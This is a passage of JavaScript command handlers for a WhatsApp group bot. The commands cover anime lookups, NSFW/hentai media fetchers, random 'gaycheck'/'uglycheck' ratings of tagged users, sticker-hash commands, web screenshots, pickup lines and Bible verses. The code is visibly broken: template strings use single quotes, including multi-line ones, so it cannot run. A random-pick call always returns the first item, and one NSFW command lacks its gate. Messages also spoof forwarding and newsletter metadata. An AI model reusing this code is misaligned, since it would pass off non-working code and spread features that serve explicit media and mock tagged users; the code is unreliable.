🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Statuts: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularitey: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*'
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de ${text}*_\n\n${animetxt}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🌿\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
                }
                break
case 'hentai_vid': case 'hentai': case 'hentai_video': {
	if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
                await KevStickWait()
                const { hentai } = require('./bibliotheque/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '${themeemoji} Titre : ${result912.title}\n${themeemoji} Categorie : ${result912.category}\n${themeemoji} Type : ${result912.type}\n${themeemoji} Vues : ${result912.views_count}\n${themeemoji} Partages : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🌿\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'hentai_neko' :
case 'hneko' :{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
    waifudd = await axios.get('https://waifu.pics/api/nsfw/neko')
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le re resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai_waifu' :
case 'nwaifu' :{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
    waifudd = await axios.get('https://waifu.pics/api/nsfw/waifu')         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()						
 waifudd = await axios.get('https://nekos.life/api/v2/img/${command}')
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return KevStickGroup()
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/milf.json'))
var kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break 
case 'pussy':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/pussy.json'))
var kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}
_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'checkme':{
					neme = args.join(" ")
					bet = '${sender}'
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = '*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*'
					try {
ppuser = await Kev.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppkev = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppkev, mentions: [bet]}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😁\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygckev('Tag Someone, Example : ${prefix + command} @Kenv~V')
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '*${command}*\n\nName : ${q}\nAnswer : *${teng}%*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😁\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygckev('Tag Someone, Example : ${prefix + command} @Kenv')
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '*${command}*\n\nName : ${q}\nAnswer : *${tik}%*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😁\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygckev('Tag Someone, Example : ${prefix + command} @Kenv')
					const kevinou =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = kevinou[Math.floor(Math.random() * kevinou.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Character Check : ${q}\nAnswer : *${taky}*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😁\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'tele_sticker': {
	if (m.isGroup) return KevStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let kevresources = await Telesticker(args[0])
		await replygckev('Encours d'envoi ${kevresources.length} stickers...')
		if (m.isGroup && kevresources.length > 10) {
			await replygckev('nombre de sticker depassant 10, le bot va l'envoyer dm.')
			for (let i = 0; i < kevresources.length; i++) {
				Kev.sendMessage(m.sender, { sticker: { url: kevresources[i].url }})
			}
		} else {
			for (let i = 0; i < kevresources.length; i++) {
				Kev.sendMessage(m.chat, { sticker: { url: kevresources[i].url }})
			}
		}
	} else replygckev('ou est le lien de sticker telegram?\nExemple. ${prefix + command} https://t.me/addstickers/FriendlyDeath')
}
break
case 'mod_cmd': {
                if (!m.quoted) return replygckev('Veuillez repondre a un message !')
                if (!m.quoted.fileSha256) return replygckev('SHA256 Hash Missing')
                if (!text) return replygckev('Pour quelle commande ?')
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygckev('Vous n.avez pas la permission de changer cette commande')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygckev('Effectuey!')
            }
            break
case 'supp_cmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygckev('No hashes')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygckev('Vous n.avez pas la permission de supprimer cette commande')             
                delete global.db.data.sticker[hash]
                replygckev('Effectuey!')
            }
            break
case 'liste_

cmd': {
                let teks = '
*Liste Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => '${index + 1}. ${value.locked ? '*${key}*' : key} : ${value.text}').join('\n')}
'.trim()
                Kev.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'block_cmd': {
                if (!KevTheCreator) return KevStickOwner()
                if (!m.quoted) return replygckev('Veuillez repondre a un message!')
                if (!m.quoted.fileSha256) return replygckev('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygckev('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygckev('Effectuey!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return replygckev('Exemple ${prefix+command} lien')
await KevStickWait()
let krt = await scp2.ssweb(q)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: krt.result}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🚀\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'pickupline': {
try {
    let res = await fetch('https://api.popcat.xyz/pickuplines')
    if (!res.ok) {
      throw new Error('API request failed with status ${res.status}')
    }
    let json = await res.json()
    let pickupLine = '*Here's a pickup line for you:*\n\n${json.pickupline}'
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😁\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = '${themeemoji}Quote\n${sentence}\n\n${themeemoji} Personage : \'\'\'${character}\'\'\'\n${themeemoji}Anime: \'\'\'${anime}\'\'\'\n'
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🌿\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error('Veuillez specifier le numero du chapitre. Exemple: ${prefix + command} Jean 3:16')
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch('${BASE_URL}/${chapterInput}')
    if (!chapterRes.ok) {
      throw new Error('Please specify the chapter number or name. Example: ${prefix + command} john 3:16')
    }
    let chapterData = await chapterRes.json();
    let translatedChapterFrench = await translate(chapterData.text, { to: 'fr', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = '
📖 *La Sainte Bible*\n
📜 *Chapitre ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Verset N: ${chapterData.verses.length}\n
🔮 *Contenu du Chapitre (French):*\n
${translatedChapterFrench.text}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}'
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
